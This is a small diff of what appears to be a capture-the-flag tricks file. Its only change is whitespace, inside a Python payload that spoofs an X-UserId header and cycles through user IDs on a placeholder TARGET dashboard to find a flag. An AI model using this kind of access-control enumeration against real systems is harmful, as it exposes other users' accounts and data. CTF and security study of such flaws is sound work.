@@ -41,10 +41,10 @@ tricks:
     how: "Iterate through user IDs to find the flag"
     payload: |
       import requests
-      
+
       s = requests.Session()
       # ... login first ...
-      
+
       for uid in range(10030, 10060):
           resp = s.get('http://TARGET/dashboard', headers={'X-UserId': str(uid)})
           if 'FLAG{' in resp.text:
